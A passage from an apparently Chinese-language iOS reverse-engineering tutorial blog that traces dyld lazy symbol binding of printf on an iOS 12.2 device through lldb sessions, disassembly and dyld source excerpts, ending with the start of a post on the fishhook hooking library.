<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000000100007f64         adrp       x9, <span class="comment">#0x100008000                            ; 0x100008000@PAGE</span></span><br><span class="line">0000000100007f68         add        x9, x9, <span class="comment">#0x0                                ; 0x100008000@PAGEOFF, _global_var</span></span><br><span class="line">0000000100007f6c         ldr        w10, [x9]                                   ; _global_var</span><br><span class="line">0000000100007f70         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000100007f74         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000100007f78         bl         _foo</span><br></pre></td></tr></table></figure>

<p>把0替换成了 0x100008000，这个地址恰好指向global_var。</p>
<p>可以看到经过linker的处理，可以正确找到global_var，符号foo同理</p>
<h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><h2 id="debug-set-up"><a href="#debug-set-up" class="headerlink" title="debug set up"></a>debug set up</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.18.24@2x.png" alt="CleanShot 2021-07-20 at 15.18.24@2x"></p>
<p>应该是签名有问题，最终解决方案：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/usr/bin/security find-identity -v -p codesigning</span><br><span class="line"># get : A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455</span><br><span class="line"></span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f libFoo.dylib</span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line"># scp ....</span><br><span class="line"># ssh ....</span><br><span class="line">mude-iPhone:/tmp root# ./main</span><br><span class="line">magic is : 4919</span><br><span class="line">4920</span><br></pre></td></tr></table></figure>

<h2 id="debug-lazy-binding-process"><a href="#debug-lazy-binding-process" class="headerlink" title="debug lazy binding process"></a>debug lazy binding process</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.19.30@2x.png" alt="CleanShot 2021-07-20 at 15.19.30@2x"></p>
<p>可以看到，第一次调用 <code>printf</code>的时候，bl跳过去并不是 printf函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue &#x3D; &#39;com.apple.main-thread&#39;, stop reason &#x3D; instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf7c main</span><br><span class="line">-&gt;  0x10089bf7c: br     x16</span><br><span class="line">    0x10089bf80: ldr    w16, 0x10089bf88</span><br><span class="line">    0x10089bf84: b      0x10089bf68</span><br><span class="line">    0x10089bf88: udf    #0x0</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 &#x3D; 0x00000001d858080c  libdyld.dylib&#96;dyld_stub_binder</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 &#x3D; 0x000000010089bfa4  &quot;magic is : %d\n&quot;</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 &#x3D; 0x0000000000001337</span><br></pre></td></tr></table></figure>

<p>通过 <code>dyld_stub_binder</code> 找 <code>printf</code>的地址，把找到的地址写回到 <code>DATA,__la_symbol_ptr</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.15@2x.png" alt="CleanShot 2021-07-20 at 15.20.15@2x"></p>
<p>第二次调用printf的时候就可以看到，这个地方printf函数地址已经被写过来了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(lldb) x/10i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">    0x100dcff6c: 0xd503201f   nop</span><br><span class="line">    0x100dcff70: 0xa9bf47f0   stp    x16, x17, [sp, <span class="comment">#-0x10]!</span></span><br><span class="line">    0x100dcff74: 0xd503201f   nop</span><br><span class="line">    0x100dcff78: 0x58000490   ldr    x16, <span class="comment">#0x90                ; (void *)0x00000001d858080c: dyld_stub_binder</span></span><br><span class="line">    0x100dcff7c: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff80: 0x18000050   ldr    w16, 0x100dcff88</span><br><span class="line">    0x100dcff84: 0x17fffff9   b      0x100dcff68</span><br><span class="line">(lldb) x/3i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">(lldb) x/gx <span class="variable">$pc</span>+0xc0</span><br><span class="line">0x100dd0020: 0x00000001d860e14c</span><br><span class="line">(lldb) memory region 0x00000001d860e14c</span><br></pre></td></tr></table></figure>

<p>所以这里就可以直接获取到地址，然后直接跳转过去就行:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf60 main`printf + 4</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf60 <span class="tag">&lt;<span class="name">+4</span>&gt;</span>: ldr    x16, #0xc0                ; (void *)0x00000001d860e14c: printf</span><br><span class="line">    0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf64 main`printf + 8</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">    0x10089bf70:      stp    x16, x17, [sp, #-0x10]!</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d860e14c  libsystem_c.dylib`printf</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>

<h2 id="libdyld-dylib-dyld-stub-binder"><a href="#libdyld-dylib-dyld-stub-binder" class="headerlink" title="libdyld.dylib`dyld_stub_binder"></a>libdyld.dylib`dyld_stub_binder</h2><p>dyld-852的代码：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.35@2x.png" alt="CleanShot 2021-07-20 at 15.20.35@2x"></p>
<p>因为我目标环境是iOS12.2，所以具体汇编代码有一些差别：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) x&#x2F;30i $pc</span><br><span class="line">-&gt;  0x1d858080c: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!</span><br><span class="line">    0x1d8580810: 0x910003fd   mov    x29, sp</span><br><span class="line">    0x1d8580814: 0xd103c3ff   sub    sp, sp, #0xf0             ; &#x3D;0xf0</span><br><span class="line">    0x1d8580818: 0xa93f07a0   stp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d858081c: 0xa93e0fa2   stp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580820: 0xa93d17a4   stp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580824: 0xa93c1fa6   stp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d8580828: 0xa93b27a8   stp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d858082c: 0xad3c07a0   stp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580830: 0xad3b0fa2   stp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580834: 0xad3a17a4   stp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d8580838: 0xad391fa6   stp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d858083c: 0xf9400fa0   ldr    x0, [x29, #0x18]</span><br><span class="line">    0x1d8580840: 0xf9400ba1   ldr    x1, [x29, #0x10]</span><br><span class="line">    0x1d8580844: 0x940004e4   bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848: 0xaa0003f0   mov    x16, x0</span><br><span class="line">    0x1d858084c: 0xa97f07a0   ldp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d8580850: 0xa97e0fa2   ldp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580854: 0xa97d17a4   ldp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580858: 0xa97c1fa6   ldp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d858085c: 0xa97b27a8   ldp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d8580860: 0xad7c07a0   ldp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580864: 0xad7b0fa2   ldp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580868: 0xad7a17a4   ldp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d858086c: 0xad791fa6   ldp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d8580870: 0x910003bf   mov    sp, x29</span><br><span class="line">    0x1d8580874: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10</span><br><span class="line">    0x1d8580878: 0x910043ff   add    sp, sp, #0x10             ; &#x3D;0x10</span><br><span class="line">    0x1d858087c: 0xd61f0200   br     x16</span><br><span class="line">    0x1d8580880: 0xd10103ff   sub    sp, sp, #0x40             ; &#x3D;0x40</span><br></pre></td></tr></table></figure>

<p>但是本质上是差不多的，影响不大。</p>
<p>下面看看怎么一步一步调用进去，找到所需要的符号</p>
<h3 id="1-call-dyld-stub-binder"><a href="#1-call-dyld-stub-binder" class="headerlink" title="1.  call dyld_stub_binder"></a>1.  call dyld_stub_binder</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000100007f98         ldr        w16, &#x3D;0x6967616d0000001a</span><br><span class="line">0000000100007f9c         b          0x100007f68</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">0000000100007f68         adr        x17, #0x100008028                           ; CODE XREF&#x3D;0x100007f84, 0x100007f90, 0x100007f9c</span><br><span class="line">&#x2F;&#x2F; x17-&gt; _dyld_private</span><br><span class="line"></span><br><span class="line">0000000100007f6c         nop</span><br><span class="line">0000000100007f70         stp        x16, x17, [sp, #-0x10]!</span><br><span class="line"></span><br><span class="line">0000000100007f74         nop</span><br><span class="line">0000000100007f78         ldr        x16, #dyld_stub_binder_100008008</span><br><span class="line"></span><br><span class="line">0000000100007f7c         br         x16 &#x2F;&#x2F; call dyld_stub_binder</span><br></pre></td></tr></table></figure>

<p>个人猜测：<code>0x000000000000001a</code> 应该是 类似 linux下elf lazy binding的时候那个index参数的东西，每个符号都不一样 。</p>
<p>初始化好需要的参数就调用进去dyld中去做符号绑定操作了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = instruction step into</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100fb7f7c main</span></span><br><span class="line">-&gt;  0x100fb7f7c: br     x16</span><br><span class="line">    0x100fb7f80: ldr    w16, 0x100fb7f88</span><br><span class="line">    0x100fb7f84: b      0x100fb7f68</span><br><span class="line">    0x100fb7f88: udf    <span class="comment">#0x0</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d858080c  libdyld.dylib`dyld_stub_binder</span><br><span class="line">(lldb) x/10gx <span class="variable">$sp</span></span><br><span class="line">0x16ee4f5a0: 0x000000000000001a 0x0000000100fb8028</span><br><span class="line">0x16ee4f5b0: 0x0000000000001337 0x0000000000000000</span><br><span class="line">0x16ee4f5c0: 0x0000000000000000 0x0000000000000001</span><br><span class="line">0x16ee4f5d0: 0x000000016ee4f5f0 0x00000001d857e8e0</span><br><span class="line">0x16ee4f5e0: 0x00000001d857e8e0 0x0000000000000000</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb7fa4  <span class="string">"magic is : %d\n"</span></span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x0000000000001337</span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = 0x00000000000120a8</span><br></pre></td></tr></table></figure>

<h3 id="2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo"><a href="#2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo" class="headerlink" title="2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)"></a>2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)</h3><p>保存栈帧，保存当前的寄存器信息(一大堆stp指令，后面符号绑定完成后，ldp会恢复，这些是成对的)，然后设置好参数，就直接转到 <code>dyld::fastBindLazySymbol</code></p>
<p>（函数前面的保存操作看起来和x86上函数开头的保存栈帧 抬高栈給临时变量预留空间的操作差不多）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Process 1465 resuming</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000001d8580844 libdyld.dylib`dyld_stub_binder + 56</span></span><br><span class="line">libdyld.dylib`dyld_stub_binder:</span><br><span class="line">-&gt;  0x1d8580844 &lt;+56&gt;: bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848 &lt;+60&gt;: mov    x16, x0</span><br><span class="line">    0x1d858084c &lt;+64&gt;: ldp    x0, x1, [x29, <span class="comment">#-0x10]</span></span><br><span class="line">    0x1d8580850 &lt;+68&gt;: ldp    x2, x3, [x29, <span class="comment">#-0x20]</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb8028  _dyld_private</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x000000000000001a</span><br></pre></td></tr></table></figure>

<p>调用的是 : <code>fastBindLazySymbol(0x0000000100fb8028, 0x1a)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  LINK_EDIT seg</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">end</span> = &amp;start[fDyldInfo-&gt;lazy_bind_size];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! getLazyBindingInfo(lazyBindingInfoOffset, start, <span class="built_in">end</span>, &amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind) )</span><br><span class="line">            dyld::throwf(<span class="string">"bad lazy bind info"</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span> (!doneAfterBind &amp;&amp; !context.strictMachORequired);</span><br></pre></td></tr></table></figure>

<p>对应汇编中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(lldb) c</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> resuming</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5e6c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">136</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5e6c</span> &lt;+<span class="number">136</span>&gt;: bl     <span class="number">0x100fe1d98</span>               ; ImageLoaderMachO::getLazyBindingInfo(<span class="keyword">unsigned</span> <span class="keyword">int</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span>*, <span class="keyword">unsigned</span> <span class="keyword">long</span>*, <span class="keyword">int</span>*, <span class="keyword">char</span> <span class="keyword">const</span>**, <span class="keyword">bool</span>*)</span><br><span class="line">    <span class="number">0x100fe5e70</span> &lt;+<span class="number">140</span>&gt;: tbz    w0, #<span class="number">0x0</span>, <span class="number">0x100fe5f80</span>     ; &lt;+<span class="number">412</span>&gt;</span><br><span class="line">    <span class="number">0x100fe5e74</span> &lt;+<span class="number">144</span>&gt;: ldrb   w1, [sp, #<span class="number">0x43</span>]</span><br><span class="line">    <span class="number">0x100fe5e78</span> &lt;+<span class="number">148</span>&gt;: ldrb   w8, [x20, #<span class="number">0x74</span>]</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100fbc030</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fbc058</span></span><br><span class="line">(lldb) memory region <span class="number">0x0000000100fbc030</span></span><br><span class="line">[<span class="number">0x0000000100fbc000</span><span class="number">-0x0000000100fc0000</span>) r-- __LINKEDIT</span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>

<p>这里用到了 我这个可执行文件的LINK_EDIT 段去做符号绑定工作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(lldb) <span class="built_in">image</span> lookup -va $x1</span><br><span class="line">      Address: main[<span class="number">0x000000010000c030</span>] (main.__LINKEDIT + <span class="number">48</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">"/private/var/tmp/main"</span>, arch = <span class="string">"arm64"</span></span><br></pre></td></tr></table></figure>

<h3 id="3-ImageLoaderMachO-getLazyBindingInfo"><a href="#3-ImageLoaderMachO-getLazyBindingInfo" class="headerlink" title="3. ImageLoaderMachO::getLazyBindingInfo"></a>3. ImageLoaderMachO::getLazyBindingInfo</h3><p>根据不同的opcode，走不同分支：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( lazyBindingInfoOffset &gt; (lazyInfoEnd-lazyInfoStart) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">bool</span> done = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span>* p = &amp;lazyInfoStart[lazyBindingInfoOffset];</span><br><span class="line">    <span class="keyword">while</span> ( !done &amp;&amp; (p &lt; lazyInfoEnd) ) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> immediate = *p &amp; BIND_IMMEDIATE_MASK;</span><br><span class="line">        <span class="keyword">uint8_t</span> opcode = *p &amp; BIND_OPCODE_MASK;</span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>获取目标符号相关的信息 :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind</span><br></pre></td></tr></table></figure>

<p>然后根据这些信息，获取该符号的地址：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uintptr_t</span> address = segActualLoadAddress(segIndex) + segOffset;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dyld版本不一致，实现的函数有些差别，但是本质是一样的</span></span><br><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5ee4</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">256</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5ee4</span> &lt;+<span class="number">256</span>&gt;: mov    x26, x0</span><br><span class="line">    <span class="number">0x100fe5ee8</span> &lt;+<span class="number">260</span>&gt;: mov    x0, x20</span><br><span class="line">    <span class="number">0x100fe5eec</span> &lt;+<span class="number">264</span>&gt;: bl     <span class="number">0x100fe1fb0</span>               ; ImageLoaderMachO::imageBaseAddress() <span class="keyword">const</span></span><br><span class="line">    <span class="number">0x100fe5ef0</span> &lt;+<span class="number">268</span>&gt;: mov    x1, x0</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br></pre></td></tr></table></figure>

<p>执行符号绑定：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = bindAt(context, <span class="keyword">this</span>, address, BIND_TYPE_POINTER, symbolName, <span class="number">0</span>, <span class="number">0</span>, libraryOrdinal,<span class="literal">NULL</span>, <span class="string">"lazy "</span>, patcher, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调试：</span></span><br><span class="line">frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f28</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">324</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f28</span> &lt;+<span class="number">324</span>&gt;: bl     <span class="number">0x100fe0664</span>               ; ImageLoaderMachO::bindLocation(ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">char</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">long</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, ImageLoaderMachO::ExtraBindData*, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">    <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001010235e0</span>  dyld::gLinkContext</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100000000</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fb8020</span>  (<span class="keyword">void</span> *)<span class="number">0x0000000100fb7f98</span></span><br><span class="line">(lldb) re re x3</span><br><span class="line">      x3 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">(lldb) re re x4</span><br><span class="line">      x4 = <span class="number">0x0000000000000001</span></span><br><span class="line">(lldb) re re x5</span><br><span class="line">      x5 = <span class="number">0x0000000100fbc04e</span></span><br><span class="line">(lldb) re re x6</span><br><span class="line">      x6 = <span class="number">0x0000000000000000</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure>

<p>执行之后:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f2c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">328</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">    <span class="number">0x100fe5f38</span> &lt;+<span class="number">340</span>&gt;: cbz    w8, <span class="number">0x100fe5e4c</span>           ; &lt;+<span class="number">104</span>&gt;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) x/gx <span class="number">0x0000000100fb8020</span></span><br><span class="line"><span class="number">0x100fb8020</span>: <span class="number">0x00000001d860e14c</span></span><br><span class="line">(lldb) <span class="built_in">image</span> lookup -va <span class="number">0x00000001d860e14c</span></span><br><span class="line">      Address: libsystem_c.dylib[<span class="number">0x00000001809a614c</span>] (libsystem_c.dylib.__TEXT.__text + <span class="number">263364</span>)</span><br><span class="line">      Summary: libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">       Module: file = <span class="string">"/Users/muhe/Library/Developer/Xcode/iOS DeviceSupport/12.2 (16E227)/Symbols/usr/lib/system/libsystem_c.dylib"</span>, arch = <span class="string">"arm64"</span></span><br><span class="line">       Symbol: id = &#123;<span class="number">0x00000617</span>&#125;, range = [<span class="number">0x00000001d860e14c</span><span class="number">-0x00000001d860e1a8</span>), name=<span class="string">"printf"</span></span><br></pre></td></tr></table></figure>

<p>可以看到符号地址已经被写过去了(0x0000000100fb8020)</p>
<p>至此，符号绑定过程完成。</p>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>《程序员的自我修养-链接、装载和库》</p>
<p><a href="https://juejin.cn/post/6844903912147795982">https://juejin.cn/post/6844903912147795982</a></p>
<p><a href="https://juejin.cn/post/6844903922654511112#heading-10">https://juejin.cn/post/6844903922654511112#heading-10</a></p>
<p><a href="https://bbs.pediy.com/thread-263907.htm">https://bbs.pediy.com/thread-263907.htm</a></p>
<p><a href="https://iosre.com/t/ios-12-4-killed-9/15633">https://iosre.com/t/ios-12-4-killed-9/15633</a></p>
]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>RE</tag>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS RE 4 beginners 3 - fishhook</title>
    <url>/2021/07/24/iOS-RE-4-beginners-3-fishhook/</url>
    <content><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>Fishhook是Facebook提供的利用MachO文件惰性加载原理，通过修改懒加载和非懒加载两个表的指针达到C函数HOOK的目的一个轻量级的hook库。理解这个工具和熟悉流程也是可以帮助更好的理解MachO文件格式 :)</p>
<span id="more"></span>

<p>原理图如下：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fishhook.png" alt="fishhook"></p>
<h1 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h1><p>核心其实就是rebind_symbols 这个接口，另一个 <code>rebind_symbols_image</code> 是指定macho中的symbol进行rebind，所以从 <code>rebind_symbols</code>函数看起就行了。</p>
